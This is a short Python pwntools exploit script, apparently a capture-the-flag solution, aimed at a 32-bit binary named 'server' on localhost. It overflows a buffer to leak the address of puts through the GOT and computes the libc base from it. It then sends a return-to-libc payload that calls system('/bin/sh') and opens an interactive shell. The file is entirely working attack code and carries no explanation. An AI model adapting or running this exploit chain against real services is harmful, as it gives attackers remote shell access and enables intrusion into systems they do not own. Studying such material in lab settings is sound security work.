from pwn import *

# target = process("./server")

elf = ELF('server')

libc = ELF("./libc6_2.27-3ubuntu1_i386.so")

target = remote("localhost", "12345")
# gdb.attach(target, gdbscript = 'b *0x08048628')

payload = b"P" * 0x3c

payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["vuln"])
payload += p32(elf.got["puts"])

target.sendline(payload)

target.recvuntil(b"Return address:")
target.recvuntil(b"Return address:")
target.recvline()
target.recvline()

puts_addr = u32(target.recv(4))
target.recvline()

libc_base = puts_addr - libc.symbols["puts"]

bin_sh_offset = next(libc.search(b"/bin/sh"))

payload = b""
payload += b"P"*0x3c
payload += p32(libc_base + libc.symbols["system"])
payload += p32(0x30303030)
payload += p32(libc_base + bin_sh_offset)

target.sendline(payload)
target.interactive()